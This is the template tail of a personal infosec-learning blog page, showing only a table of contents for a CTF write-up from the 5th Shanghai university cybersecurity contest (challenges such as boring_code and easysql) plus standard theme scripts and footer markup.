                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第五届上海市大学生网络安全大赛"><span class="toc-number">1.</span> <span class="toc-text">第五届上海市大学生网络安全大赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bytectf-boring-code"><span class="toc-number">1.1.</span> <span class="toc-text">Bytectf boring_code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#decade"><span class="toc-number">1.2.</span> <span class="toc-text">decade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyt5"><span class="toc-number">1.3.</span> <span class="toc-text">babyt5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.4.</span> <span class="toc-text">easysql</span></a></li></ol></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2019
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/knlvre.github.io/js/plugin.js"></script>
<script src="/knlvre.github.io/js/obsidian.js"></script>
<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
<script src="/knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
